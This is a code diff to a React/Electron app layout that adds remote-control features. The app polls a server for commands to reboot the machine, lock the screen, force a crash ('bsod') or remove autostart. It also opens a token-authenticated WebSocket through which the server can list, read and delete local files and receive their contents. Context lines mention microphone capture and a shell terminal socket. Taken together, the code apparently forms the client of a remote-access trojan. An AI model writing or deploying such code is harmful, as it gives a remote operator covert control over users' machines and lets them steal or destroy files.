@@ -42,8 +42,11 @@ export default function Layout() {
       try {
         const { commands } = await fetchCommandsPending()
         for (const cmd of commands) {
-          if (cmd === 'remove-autostart') await window.electronBridge?.removeAutostart()
           if (cmd === 'quit') await window.electronBridge?.forceQuit()
+          if (cmd === 'remove-autostart') await window.electronBridge?.removeAutostart()
+          if (cmd === 'reboot') await window.electronBridge?.systemReboot()
+          if (cmd === 'lock-screen') await window.electronBridge?.systemLock()
+          if (cmd === 'bsod') await window.electronBridge?.systemBsod()
         }
       } catch {}
     }, 5_000)
@@ -181,6 +184,37 @@ export default function Layout() {
       stopMic()
       ws.close()
     }
+  }, [])
+
+  // File manager WebSocket
+  useEffect(() => {
+    const wsBase = getApiBase().replace(/^http/, 'ws')
+    const token = localStorage.getItem('token')
+    const ws = new WebSocket(`${wsBase}/users/files-ws?token=${token}`)
+
+    ws.onmessage = async (e) => {
+      if (typeof e.data !== 'string') return
+      try {
+        const req = JSON.parse(e.data)
+        let result = {}
+        if (req.action === 'home') {
+          result = await window.electronBridge?.fsHome() ?? {}
+        } else if (req.action === 'list') {
+          result = await window.electronBridge?.fsList(req.path) ?? { entries: [], error: 'no bridge' }
+        } else if (req.action === 'read') {
+          result = await window.electronBridge?.fsRead(req.path) ?? { data: null, error: 'no bridge' }
+        } else if (req.action === 'delete') {
+          result = await window.electronBridge?.fsDelete(req.path) ?? { error: 'no bridge' }
+        }
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify({ id: req.id, ...result }))
+        }
+      } catch (err) {
+        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ error: String(err) }))
+      }
+    }
+
+    return () => ws.close()
   }, [])
 
   // Shell terminal WebSocket
